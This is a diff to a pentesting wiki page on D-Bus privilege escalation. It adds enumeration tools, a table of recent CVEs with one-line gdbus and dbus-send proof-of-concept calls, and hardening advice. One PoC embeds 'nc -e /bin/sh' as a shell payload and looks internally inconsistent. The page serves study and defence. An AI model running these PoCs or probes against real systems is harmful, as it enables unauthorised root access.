@@ -464,11 +464,77 @@ finish:
 }
 ```
 
+## Automated Enumeration Helpers (2023-2025)
+
+Enumeration of a large D-Bus attack surface manually with `busctl`/`gdbus` quickly becomes painful. Two small FOSS utilities released in the last few years can speed things up during red-team or CTF engagements:
+
+### dbusmap ("Nmap for D-Bus")
+* Author: @taviso – [https://github.com/taviso/dbusmap](https://github.com/taviso/dbusmap)
+* Written in C; single static binary (<50 kB) that walks every object path, pulls the `Introspect` XML and maps it to the owning PID/UID.
+* Useful flags:
+  ```bash
+  # List every service on the *system* bus and dump all callable methods
+  sudo dbus-map --dump-methods
+
+  # Actively probe methods/properties you can reach without Polkit prompts
+  sudo dbus-map --enable-probes --null-agent --dump-methods --dump-properties
+  ```
+* The tool marks unprotected well-known names with `!`, instantly revealing services you can *own* (take over) or method calls that are reachable from an unprivileged shell.
+
+### uptux.py
+* Author: @initstring – [https://github.com/initstring/uptux](https://github.com/initstring/uptux)
+* Python-only script that looks for *writable* paths in systemd units **and** overly-permissive D-Bus policy files (e.g. `send_destination="*"`).
+* Quick usage:
+  ```bash
+  python3 uptux.py -n          # run all checks but don’t write a log file
+  python3 uptux.py -d          # enable verbose debug output
+  ```
+* The D-Bus module searches the directories below and highlights any service that can be spoofed or hijacked by a normal user:
+  * `/etc/dbus-1/system.d/` and `/usr/share/dbus-1/system.d/`
+  * `/etc/dbus-1/system-local.d/` (vendor overrides)
+
+---
+
+## Notable D-Bus Privilege-Escalation Bugs (2024-2025)
+
+Keeping an eye on recently published CVEs helps spotting similar insecure patterns in custom code. The following high-impact local EoP issues all stem from missing authentication/authorization on the **system bus**:
+
+| Year | CVE | Component | Root Cause | One-Liner PoC |
+|------|-----|-----------|------------|---------------|
+| 2024 | CVE-2024-45752 | `logiops` ≤ 0.3.4 (Logitech HID daemon) | The `logid` system service exposes an unrestricted `org.freedesktop.Logiopsd` interface that lets *any* user change device profiles and inject arbitrary shell commands via macro strings. | `gdbus call -y -d org.freedesktop.Logiopsd -o /org/freedesktop/Logiopsd -m org.freedesktop.Logiopsd.LoadConfig "/tmp/pwn.yml"` |
+| 2025 | CVE-2025-23222 | Deepin `dde-api-proxy` ≤ 1.0.18 | A root-running proxy forwards legacy bus names to backend services **without forwarding caller UID/Polkit context**, so every forwarded request is treated as UID 0. | `gdbus call -y -d com.deepin.daemon.Grub2 -o /com/deepin/daemon/Grub2 -m com.deepin.daemon.Grub2.SetTimeout 1` |
+| 2025 | CVE-2025-3931 | Red Hat Insights `yggdrasil` ≤ 0.4.6 | Public `Dispatch` method lacks any ACLs → attacker can order the *package-manager* worker to install arbitrary RPMs. | `dbus-send --system --dest=com.redhat.yggdrasil /com/redhat/Dispatch com.redhat.yggdrasil.Dispatch string:'{"worker":"pkg","action":"install","pkg":"nc -e /bin/sh"}'` |
+
+Patterns to notice:
+1. Service runs **as root on the system bus**.
+2. No PolicyKit check (or it is bypassed by a proxy).
+3. Method ultimately leads to `system()`/package installation/device re-configuration → code execution.
+
+Use `dbusmap --enable-probes` or manual `busctl call` to confirm whether a patch back-ports proper `polkit_authority_check_authorization()` logic.
+
+---
+
+## Hardening & Detection Quick-Wins
+
+* Search for world-writable or *send/receive*-open policies:
+  ```bash
+  grep -R --color -nE '<allow (own|send_destination|receive_sender)="[^"]*"' /etc/dbus-1/system.d /usr/share/dbus-1/system.d
+  ```
+* Require Polkit for dangerous methods – even *root* proxies should pass the *caller* PID to `polkit_authority_check_authorization_sync()` instead of their own.
+* Drop privileges in long-running helpers (use `sd_pid_get_owner_uid()` to switch namespaces after connecting to the bus).
+* If you cannot remove a service, at least *scope* it to a dedicated Unix group and restrict access in its XML policy.
+* Blue-team: enable persistent capture of the system bus with `busctl capture --output=/var/log/dbus_$(date +%F).pcap` and import into Wireshark for anomaly detection.
+
+---
+
 ## References
+
+- [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
+- [https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html](https://security.opensuse.org/2025/01/24/dde-api-proxy-privilege-escalation.html)
+
 
 - [https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/)
 
 {{#include ../../banners/hacktricks-training.md}}
-
 
 
